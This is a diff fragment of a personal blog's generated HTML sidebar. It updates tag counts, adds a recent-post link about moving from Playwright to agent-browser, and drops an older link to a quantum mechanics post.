+			<li><a href="/tags/CoD/">CoD<span>16</span></a></li>
+		
+			<li><a href="/tags/Lyrics/">Lyrics<span>4</span></a></li>
+		
+			<li><a href="/tags/雅歌/">雅歌<span>2</span></a></li>
+		
+			<li><a href="/tags/自分を休ませる/">自分を休ませる<span>3</span></a></li>
 		
 		
 			<li><a href="/tags">...<span>22</span></a></li>
@@ -3347,6 +3992,10 @@ British female writer. Her works mainly bear the imprint of philosophical and so
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2026/02/07/Agent-Browser/" ><i class="fa fa-file-o"></i>从 Playwright 到 agent-browse...</a>
+      </li>
+    
+      <li>
         <a href="/2026/01/16/LLM-Hallucination/" ><i class="fa fa-file-o"></i>LLM 幻觉</a>
       </li>
     
@@ -3360,10 +4009,6 @@ British female writer. Her works mainly bear the imprint of philosophical and so
     
       <li>
         <a href="/2025/06/14/IoT技术学习指南/" ><i class="fa fa-file-o"></i>IoT技术学习指南</a>
-      </li>
-    
-      <li>
-        <a href="/2024/07/31/量子力学/" ><i class="fa fa-file-o"></i>量子力学</a>
       </li>
     
   </ul>
